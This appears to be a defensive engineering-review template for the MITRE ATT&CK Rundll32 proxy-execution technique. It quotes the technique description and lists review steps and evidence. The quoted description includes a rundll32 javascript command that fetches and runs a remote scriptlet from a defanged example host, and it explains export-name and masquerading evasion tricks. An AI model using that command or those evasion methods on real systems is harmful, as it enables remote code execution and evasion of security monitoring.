# Rundll32 Technique Engineering Review

## Reference

- Technique: **T1218.011 — Rundll32**

Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}). Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. For example, ClickOnce can be proxied through Rundll32.exe. Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")" This behavior has been seen used by malware such as Poweliks. Threat actors may also abuse legitimate, signed system DLLs (e.g., zipfldr.dll, ieframe.dll) with rundll32.exe to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection. Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1). Additionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.

## Engineering review

1. Identify the engineering boundary where the technique would apply: the component, the service, or the deployment.
2. Review the design decision that would prevent the technique, and record the alternative considered.
3. Review the implementation evidence for the preventive control.
4. Review the test coverage that would fail if the control regressed.
5. Review the observability: which signal would show the control is not operating.
6. Record the residual risk where prevention is not achievable, and the detection that compensates.

## Review evidence

- the design record for the preventive decision;
- the implementation or configuration evidence;
- the test record showing the control is exercised;
- the observability mapping.

## Limitations

An engineering review describes what the design and the implementation evidence show. It does not claim the technique has been addressed in production.

## Source

- MITRE ATT&CK: https://attack.mitre.org/
- T1218.011: https://attack.mitre.org/techniques/T1218/011
- Reviewed: 2026-10-27
